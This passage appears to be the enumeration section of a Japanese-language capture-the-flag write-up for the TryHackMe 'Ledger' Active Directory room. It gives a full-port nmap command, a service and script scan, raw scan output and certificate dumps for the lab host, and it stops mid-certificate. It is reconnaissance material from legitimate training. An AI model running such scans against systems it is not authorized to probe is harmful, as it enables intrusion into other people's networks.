
- URL : https://tryhackme.com/room/ledger
- #hard 
- OS : #Windows
- Machine Author(s): [tryhackme](https://tryhackme.com/p/tryhackme),[h4sh3m00](https://tryhackme.com/p/h4sh3m00)
- Hack Date: 2025-06-23


# Enumeration
これはADだね

| ポート番号     | 状態   | サービス           | バージョンなどの補足                          |
| --------- | ---- | -------------- | ----------------------------------- |
| 53/tcp    | open | **DNS**        | Simple DNS Plus                     |
| 80/tcp    | open | **HTTP**       | Microsoft IIS httpd 10.0            |
| 88/tcp    | open | **kerberos**   | Windows Kerberos                    |
| 135/tcp   | open | msrpc          | Microsoft Windows RPC               |
| 139/tcp   | open | netbios-ssn    | Microsoft Windows netbios-ssn       |
| 389/tcp   | open | **ldap**       | AD LDAP (thm.local)                 |
| 443/tcp   | open | **HTTPS**      | Microsoft IIS httpd 10.0            |
| 445/tcp   | open | **SMB**        | 不明                                  |
| 464/tcp   | open | kpasswd5       | 不明                                  |
| 593/tcp   | open | http-rpc-epmap | Microsoft Windows RPC over HTTP 1.0 |
| 636/tcp   | open | ssl/ldap       | AD LDAP over SSL                    |
| 3268/tcp  | open | ldap           | Global Catalog                      |
| 3269/tcp  | open | **LDAPS**      | Global Catalog over SSL             |
| 3389/tcp  | open | **RDP**        | Microsoft Terminal Services         |
| 9389/tcp  | open | mc-nmf         | .NET Message Framing                |
| 47001/tcp | open | winrm          | Microsoft HTTPAPI httpd 2.0         |
| 49664/tcp | open | msrpc          | Windows RPC                         |
| 49665/tcp | open | msrpc          | Windows RPC                         |
| 49667/tcp | open | msrpc          | Windows RPC                         |
| 49669/tcp | open | msrpc          | Windows RPC                         |
| 49672/tcp | open | msrpc          | Windows RPC                         |
| 49676/tcp | open | msrpc          | Windows RPC                         |
| 49685/tcp | open | ncacn_http     | RPC over HTTP 1.0                   |
| 49686/tcp | open | msrpc          | Windows RPC                         |
| 49689/tcp | open | msrpc          | Windows RPC                         |
| 49694/tcp | open | msrpc          | Windows RPC                         |
| 49718/tcp | open | msrpc          | Windows RPC                         |
| 49721/tcp | open | msrpc          | Windows RPC                         |
| 49726/tcp | open | msrpc          | Windows RPC                         |
| 49793/tcp | open | msrpc          | Windows RPC                         |
ドメイン名？ : labyrinth.thm.local



```bash
└─$ sudo nmap -p0-65535 -T4 -Pn -v --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv $Target_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 03:28 PDT
Initiating Parallel DNS resolution of 1 host. at 03:28
Completed Parallel DNS resolution of 1 host. at 03:28, 5.52s elapsed
Initiating SYN Stealth Scan at 03:28
Scanning 10.10.133.131 [65536 ports]
Discovered open port 135/tcp on 10.10.133.131
Discovered open port 445/tcp on 10.10.133.131
Discovered open port 3389/tcp on 10.10.133.131
Discovered open port 80/tcp on 10.10.133.131
Discovered open port 443/tcp on 10.10.133.131
Discovered open port 139/tcp on 10.10.133.131
Discovered open port 53/tcp on 10.10.133.131
Discovered open port 49667/tcp on 10.10.133.131
Discovered open port 3269/tcp on 10.10.133.131
Discovered open port 49676/tcp on 10.10.133.131
Discovered open port 49686/tcp on 10.10.133.131
Discovered open port 49664/tcp on 10.10.133.131
Discovered open port 49686/tcp on 10.10.133.131
SYN Stealth Scan Timing: About 25.88% done; ETC: 03:30 (0:01:29 remaining)
Discovered open port 88/tcp on 10.10.133.131
SYN Stealth Scan Timing: About 26.17% done; ETC: 03:32 (0:02:52 remaining)
SYN Stealth Scan Timing: About 26.38% done; ETC: 03:34 (0:04:14 remaining)
Discovered open port 49685/tcp on 10.10.133.131
Discovered open port 49665/tcp on 10.10.133.131
Discovered open port 49665/tcp on 10.10.133.131
SYN Stealth Scan Timing: About 37.56% done; ETC: 03:33 (0:03:21 remaining)
Discovered open port 49793/tcp on 10.10.133.131
Discovered open port 49726/tcp on 10.10.133.131
Discovered open port 49721/tcp on 10.10.133.131
Discovered open port 464/tcp on 10.10.133.131
Discovered open port 49694/tcp on 10.10.133.131
Discovered open port 3268/tcp on 10.10.133.131
Discovered open port 3268/tcp on 10.10.133.131
Discovered open port 636/tcp on 10.10.133.131
Discovered open port 49672/tcp on 10.10.133.131
Discovered open port 49718/tcp on 10.10.133.131
SYN Stealth Scan Timing: About 70.57% done; ETC: 03:32 (0:01:03 remaining)
Discovered open port 9389/tcp on 10.10.133.131
Discovered open port 49669/tcp on 10.10.133.131
Discovered open port 49669/tcp on 10.10.133.131
Discovered open port 47001/tcp on 10.10.133.131
Discovered open port 593/tcp on 10.10.133.131
Discovered open port 49689/tcp on 10.10.133.131
Discovered open port 389/tcp on 10.10.133.131
Completed SYN Stealth Scan at 03:31, 185.70s elapsed (65536 total ports)
Nmap scan report for 10.10.133.131
Host is up (0.29s latency).
Not shown: 65426 closed tcp ports (reset), 80 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49676/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49689/tcp open  unknown
49694/tcp open  unknown
49718/tcp open  unknown
49721/tcp open  unknown
49726/tcp open  unknown
49793/tcp open  unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 191.38 seconds
           Raw packets sent: 84423 (3.715MB) | Rcvd: 74926 (2.997MB)
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 03:31 PDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:31
Completed NSE at 03:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:31
Completed NSE at 03:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:31
Completed NSE at 03:31, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 03:31
Completed Parallel DNS resolution of 1 host. at 03:31, 5.51s elapsed
Initiating SYN Stealth Scan at 03:31
Scanning 10.10.133.131 [30 ports]
Discovered open port 443/tcp on 10.10.133.131
Discovered open port 53/tcp on 10.10.133.131
Discovered open port 3389/tcp on 10.10.133.131
Discovered open port 135/tcp on 10.10.133.131
Discovered open port 445/tcp on 10.10.133.131
Discovered open port 139/tcp on 10.10.133.131
Discovered open port 80/tcp on 10.10.133.131
Discovered open port 49721/tcp on 10.10.133.131
Discovered open port 593/tcp on 10.10.133.131
Discovered open port 47001/tcp on 10.10.133.131
Discovered open port 3268/tcp on 10.10.133.131
Discovered open port 49793/tcp on 10.10.133.131
Discovered open port 464/tcp on 10.10.133.131
Discovered open port 49685/tcp on 10.10.133.131
Discovered open port 49664/tcp on 10.10.133.131
Discovered open port 49667/tcp on 10.10.133.131
Discovered open port 49726/tcp on 10.10.133.131
Discovered open port 49686/tcp on 10.10.133.131
Discovered open port 636/tcp on 10.10.133.131
Discovered open port 389/tcp on 10.10.133.131
Discovered open port 49718/tcp on 10.10.133.131
Discovered open port 88/tcp on 10.10.133.131
Discovered open port 49694/tcp on 10.10.133.131
Discovered open port 49669/tcp on 10.10.133.131
Discovered open port 49665/tcp on 10.10.133.131
Discovered open port 9389/tcp on 10.10.133.131
Discovered open port 3269/tcp on 10.10.133.131
Discovered open port 49672/tcp on 10.10.133.131
Discovered open port 49676/tcp on 10.10.133.131
Discovered open port 49689/tcp on 10.10.133.131
Completed SYN Stealth Scan at 03:31, 0.56s elapsed (30 total ports)
Initiating Service scan at 03:31
Scanning 30 services on 10.10.133.131
Service scan Timing: About 56.67% done; ETC: 03:33 (0:00:39 remaining)
Completed Service scan at 03:32, 65.64s elapsed (30 services on 1 host)
Initiating OS detection (try #1) against 10.10.133.131
Retrying OS detection (try #2) against 10.10.133.131
Initiating Traceroute at 03:32
Completed Traceroute at 03:32, 0.26s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 03:32
Completed Parallel DNS resolution of 2 hosts. at 03:33, 5.51s elapsed
NSE: Script scanning 10.10.133.131.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 03:33
Completed NSE at 03:33, 24.33s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 03:33
Completed NSE at 03:33, 4.73s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 03:33
Completed NSE at 03:33, 0.00s elapsed
Nmap scan report for 10.10.133.131
Host is up, received user-set (0.26s latency).
Scanned at 2025-06-23 03:31:45 PDT for 105s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-23 10:31:52Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-23T10:33:24+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-24T14:40:22
| Not valid after:  2025-06-24T14:40:22
| MD5:   011d:3d11:b9f2:51e8:4a11:793c:4f9c:44fd
| SHA-1: 2c8a:2c63:9d07:3788:d316:f6c8:a32f:a7d3:c04b:b27d
| -----BEGIN CERTIFICATE-----
| MIIGNjCCBR6gAwIBAgITSwAAABSikbtqRelyzQAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBHMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxEzARBgoJkiaJk/IsZAEZFgN0aG0x
| GTAXBgNVBAMTEHRobS1MQUJZUklOVEgtQ0EwHhcNMjQwNjI0MTQ0MDIyWhcNMjUw
| NjI0MTQ0MDIyWjAeMRwwGgYDVQQDExNsYWJ5cmludGgudGhtLmxvY2FsMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2IwxsVm2r2hTQVvNrlaszoA4tZEl
| Vngz+xQNEFvi2pJX/FuVbOviuhfKP5yeotBM6WpT4LDr5vRZJXBzp5MTaei4jaFG
| rXuz6af2CuZ0cE2YzbFxu5GDNhtBAg/XetoJLW4M6dq2PzwJpnDYsmYBjjWPm6UV
| B2JQzoaXAa6TEAamReeynA66ZoOAMEDkHwR7kIdTVgk7rF6t0ikqgB1Ji1brl2FV
| Gocb5ajMu8o2H5iMb4jzT7jWfA21tME9sKkFw4jamb105rdWGwu8D6wtX1O6v79m
| VcGWowWXTM1GmDJv8dE50ZSNjx051lDTangjAgj+PbJ5YeEIbXyosXuFgQIDAQAB
| o4IDQjCCAz4wLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIA
| bwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8B
| Af8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZI
| hvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAEC
| MAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUSvJ+
| XzE5VSR2n89rzpq1bismKSowHwYDVR0jBBgwFoAUCXC348VycpOwcQwjQqSW/b4C
| HRMwgc4GA1UdHwSBxjCBwzCBwKCBvaCBuoaBt2xkYXA6Ly8vQ049dGhtLUxBQllS
| SU5USC1DQSxDTj1sYWJ5cmludGgsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9dGhtLERDPWxv
| Y2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1j
| UkxEaXN0cmlidXRpb25Qb2ludDCBwAYIKwYBBQUHAQEEgbMwgbAwga0GCCsGAQUF
| BzAChoGgbGRhcDovLy9DTj10aG0tTEFCWVJJTlRILUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPXRobSxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
| Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA/BgNVHREEODA2oB8GCSsGAQQBgjcZAaAS
| BBD12WVTnqWuQJRIswNyBhF8ghNsYWJ5cmludGgudGhtLmxvY2FsME0GCSsGAQQB
| gjcZAgRAMD6gPAYKKwYBBAGCNxkCAaAuBCxTLTEtNS0yMS0xOTY2NTMwNjAxLTMx
| ODU1MTA3MTItMTA2MDQ2MjQtMTAwODANBgkqhkiG9w0BAQsFAAOCAQEAaTn4Z9XD
| lLy+HrYZ9hyFo23AyOCo16CRbyG3y4jJ+cEyOpNTg5AaLUFGWATqhBFlFkxshycf
| fEKSbq/pD+6Xwlrt518Cr5FVbEPv8IqvheAlL7KtkgRWO5uVqLupUyRslAN+g7CK
| 4IDSrufw4O6r93YYi4/7HCSUPr4hO/SVNM90T952DUkDjDJo5W7uVTzelUPEkD5x
| jqyvyrDm3ys++oqlunS9bZ5F5qkugqIhEBqR9iwiCPsuXcmuo7JNcjet7bdV1Whu
| I1tFNZc1F2UE2iQlLJfTWwbw0gcc4y1GdgFU9ou7ZbdvVaxImE7C0dwU6RIgJj0N
| lmwp0rZTVdv7qw==
|_-----END CERTIFICATE-----
443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:26:00
| Not valid after:  2028-05-12T07:35:59
| MD5:   c249:3bc6:fd31:f2aa:83cb:2774:bc66:9151
| SHA-1: 397a:54df:c1ff:f9fd:57e4:a944:00e8:cfdb:6e3a:972b
| -----BEGIN CERTIFICATE-----
| MIIDaTCCAlGgAwIBAgIQUiXALddQ7bNA6YS8dfCQKTANBgkqhkiG9w0BAQsFADBH
| MRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxEzARBgoJkiaJk/IsZAEZFgN0aG0xGTAX
| BgNVBAMTEHRobS1MQUJZUklOVEgtQ0EwHhcNMjMwNTEyMDcyNjAwWhcNMjgwNTEy
| MDczNTU5WjBHMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxEzARBgoJkiaJk/IsZAEZ
| FgN0aG0xGTAXBgNVBAMTEHRobS1MQUJZUklOVEgtQ0EwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQC/NNh6IN5jNgejLjqq9/RVDR42kxE0UZvnW6cB1LNb
| 0c4GyNmA1h+oLDpz1DonC3Yhp9XPQJIj4ejN1ErCQFMAxW4Xcd/Gt/LSCjdBHgmR
| R8wItUOpOoXkQtVRUE4I7vlWzxBuCVo644NaNzbfqVj7M1/nCBjn/PPd2fX3etSX
| EsaI6bYcdmKRimC/94UP8qTs6Z+KGasXUmb7Sj8vscncY8lFLe9qREuiRrom5Q8A
| NySO4t8mtmqIHrBb8zTTZ9N/HxEOPDafCSTOjRhDVsOXVuWllTJujjSu+jJlBiF/
| aiXM7mOmsxH1rqCUK9mhZFSf/OhvgsvAq66sTBs1huE1AgMBAAGjUTBPMAsGA1Ud
| DwQEAwIBhjAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBQJcLfjxXJyk7BxDCNC
| pJb9vgIdEzAQBgkrBgEEAYI3FQEEAwIBADANBgkqhkiG9w0BAQsFAAOCAQEAmnUK
| Wj9AoBc2fuoVml4Orlg+ce7x+1IBTpqeKaobBx/ez+i5mV2U45MgPHPwjHzf15bn
| 0BnYpJUhlEljx7+voM+pfP/9Q21v5iXjgIcH9FLau2nqhcQOnttNj8I4aoDr5rRG
| fJJv+hAuNXxr/Fy5M7oghCpNqxseEU9OcgIPRHp6X/8bTtEYWaHnD3GS6uUR2jai
| PhReAcCPTbRwMRA3KsGRaBF3+PsIOL0JtCR+QGfOugPhUJFOU7w0dwbFmzfRcgKw
| bJhEy3o0FL5aqKVC823QJE7LosyLdtAqtZY7OgtT0Do7RZzdsZ1If0JmYmHTSRVz
| 8CvPpcCDp68aiTtqgA==
|_-----END CERTIFICATE-----
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2025-06-23T10:33:24+00:00; -1s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-23T10:33:24+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-24T14:40:22
| Not valid after:  2025-06-24T14:40:22
| MD5:   011d:3d11:b9f2:51e8:4a11:793c:4f9c:44fd
| SHA-1: 2c8a:2c63:9d07:3788:d316:f6c8:a32f:a7d3:c04b:b27d
| -----BEGIN CERTIFICATE-----
| MIIGNjCCBR6gAwIBAgITSwAAABSikbtqRelyzQAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBHMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxEzARBgoJkiaJk/IsZAEZFgN0aG0x
| GTAXBgNVBAMTEHRobS1MQUJZUklOVEgtQ0EwHhcNMjQwNjI0MTQ0MDIyWhcNMjUw
| NjI0MTQ0MDIyWjAeMRwwGgYDVQQDExNsYWJ5cmludGgudGhtLmxvY2FsMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2IwxsVm2r2hTQVvNrlaszoA4tZEl
| Vngz+xQNEFvi2pJX/FuVbOviuhfKP5yeotBM6WpT4LDr5vRZJXBzp5MTaei4jaFG
| rXuz6af2CuZ0cE2YzbFxu5GDNhtBAg/XetoJLW4M6dq2PzwJpnDYsmYBjjWPm6UV
| B2JQzoaXAa6TEAamReeynA66ZoOAMEDkHwR7kIdTVgk7rF6t0ikqgB1Ji1brl2FV
| Gocb5ajMu8o2H5iMb4jzT7jWfA21tME9sKkFw4jamb105rdWGwu8D6wtX1O6v79m
| VcGWowWXTM1GmDJv8dE50ZSNjx051lDTangjAgj+PbJ5YeEIbXyosXuFgQIDAQAB
| o4IDQjCCAz4wLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIA
| bwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8B
| Af8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZI
| hvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAEC
| MAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUSvJ+
| XzE5VSR2n89rzpq1bismKSowHwYDVR0jBBgwFoAUCXC348VycpOwcQwjQqSW/b4C
| HRMwgc4GA1UdHwSBxjCBwzCBwKCBvaCBuoaBt2xkYXA6Ly8vQ049dGhtLUxBQllS
| SU5USC1DQSxDTj1sYWJ5cmludGgsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9dGhtLERDPWxv
| Y2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1j
| UkxEaXN0cmlidXRpb25Qb2ludDCBwAYIKwYBBQUHAQEEgbMwgbAwga0GCCsGAQUF
| BzAChoGgbGRhcDovLy9DTj10aG0tTEFCWVJJTlRILUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPXRobSxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
| Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA/BgNVHREEODA2oB8GCSsGAQQBgjcZAaAS
| BBD12WVTnqWuQJRIswNyBhF8ghNsYWJ5cmludGgudGhtLmxvY2FsME0GCSsGAQQB
| gjcZAgRAMD6gPAYKKwYBBAGCNxkCAaAuBCxTLTEtNS0yMS0xOTY2NTMwNjAxLTMx
| ODU1MTA3MTItMTA2MDQ2MjQtMTAwODANBgkqhkiG9w0BAQsFAAOCAQEAaTn4Z9XD
| lLy+HrYZ9hyFo23AyOCo16CRbyG3y4jJ+cEyOpNTg5AaLUFGWATqhBFlFkxshycf
| fEKSbq/pD+6Xwlrt518Cr5FVbEPv8IqvheAlL7KtkgRWO5uVqLupUyRslAN+g7CK
| 4IDSrufw4O6r93YYi4/7HCSUPr4hO/SVNM90T952DUkDjDJo5W7uVTzelUPEkD5x
| jqyvyrDm3ys++oqlunS9bZ5F5qkugqIhEBqR9iwiCPsuXcmuo7JNcjet7bdV1Whu
| I1tFNZc1F2UE2iQlLJfTWwbw0gcc4y1GdgFU9ou7ZbdvVaxImE7C0dwU6RIgJj0N
| lmwp0rZTVdv7qw==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-23T10:33:24+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-24T14:40:22
| Not valid after:  2025-06-24T14:40:22
| MD5:   011d:3d11:b9f2:51e8:4a11:793c:4f9c:44fd
| SHA-1: 2c8a:2c63:9d07:3788:d316:f6c8:a32f:a7d3:c04b:b27d
| -----BEGIN CERTIFICATE-----
| MIIGNjCCBR6gAwIBAgITSwAAABSikbtqRelyzQAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBHMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxEzARBgoJkiaJk/IsZAEZFgN0aG0x
| GTAXBgNVBAMTEHRobS1MQUJZUklOVEgtQ0EwHhcNMjQwNjI0MTQ0MDIyWhcNMjUw
| NjI0MTQ0MDIyWjAeMRwwGgYDVQQDExNsYWJ5cmludGgudGhtLmxvY2FsMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2IwxsVm2r2hTQVvNrlaszoA4tZEl
| Vngz+xQNEFvi2pJX/FuVbOviuhfKP5yeotBM6WpT4LDr5vRZJXBzp5MTaei4jaFG
| rXuz6af2CuZ0cE2YzbFxu5GDNhtBAg/XetoJLW4M6dq2PzwJpnDYsmYBjjWPm6UV
| B2JQzoaXAa6TEAamReeynA66ZoOAMEDkHwR7kIdTVgk7rF6t0ikqgB1Ji1brl2FV
| Gocb5ajMu8o2H5iMb4jzT7jWfA21tME9sKkFw4jamb105rdWGwu8D6wtX1O6v79m
| VcGWowWXTM1GmDJv8dE50ZSNjx051lDTangjAgj+PbJ5YeEIbXyosXuFgQIDAQAB
| o4IDQjCCAz4wLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIA
| bwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8B
| Af8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZI
| hvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAEC
| MAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUSvJ+
| XzE5VSR2n89rzpq1bismKSowHwYDVR0jBBgwFoAUCXC348VycpOwcQwjQqSW/b4C
| HRMwgc4GA1UdHwSBxjCBwzCBwKCBvaCBuoaBt2xkYXA6Ly8vQ049dGhtLUxBQllS
| SU5USC1DQSxDTj1sYWJ5cmludGgsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9dGhtLERDPWxv
| Y2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1j
| UkxEaXN0cmlidXRpb25Qb2ludDCBwAYIKwYBBQUHAQEEgbMwgbAwga0GCCsGAQUF
| BzAChoGgbGRhcDovLy9DTj10aG0tTEFCWVJJTlRILUNBLENOPUFJQSxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPXRobSxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9
| Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA/BgNVHREEODA2oB8GCSsGAQQBgjcZAaAS
| BBD12WVTnqWuQJRIswNyBhF8ghNsYWJ5cmludGgudGhtLmxvY2FsME0GCSsGAQQB
| gjcZAgRAMD6gPAYKKwYBBAGCNxkCAaAuBCxTLTEtNS0yMS0xOTY2NTMwNjAxLTMx
| ODU1MTA3MTItMTA2MDQ2MjQtMTAwODANBgkqhkiG9w0BAQsFAAOCAQEAaTn4Z9XD
| lLy+HrYZ9hyFo23AyOCo16CRbyG3y4jJ+cEyOpNTg5AaLUFGWATqhBFlFkxshycf
| fEKSbq/pD+6Xwlrt518Cr5FVbEPv8IqvheAlL7KtkgRWO5uVqLupUyRslAN+g7CK
| 4IDSrufw4O6r93YYi4/7HCSUPr4hO/SVNM90T952DUkDjDJo5W7uVTzelUPEkD5x
| jqyvyrDm3ys++oqlunS9bZ5F5qkugqIhEBqR9iwiCPsuXcmuo7JNcjet7bdV1Whu
| I1tFNZc1F2UE2iQlLJfTWwbw0gcc4y1GdgFU9ou7ZbdvVaxImE7C0dwU6RIgJj0N
| lmwp0rZTVdv7qw==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-23T10:33:24+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-24T14:40:22
| Not valid after:  2025-06-24T14:40:22
| MD5:   011d:3d11:b9f2:51e8:4a11:793c:4f9c:44fd
| SHA-1: 2c8a:2c63:9d07:3788:d316:f6c8:a32f:a7d3:c04b:b27d
| -----BEGIN CERTIFICATE-----
| MIIGNjCCBR6gAwIBAgITSwAAABSikbtqRelyzQAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBHMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxEzARBgoJkiaJk/IsZAEZFgN0aG0x
| GTAXBgNVBAMTEHRobS1MQUJZUklOVEgtQ0EwHhcNMjQwNjI0MTQ0MDIyWhcNMjUw
| NjI0MTQ0MDIyWjAeMRwwGgYDVQQDExNsYWJ5cmludGgudGhtLmxvY2FsMIIBIjAN
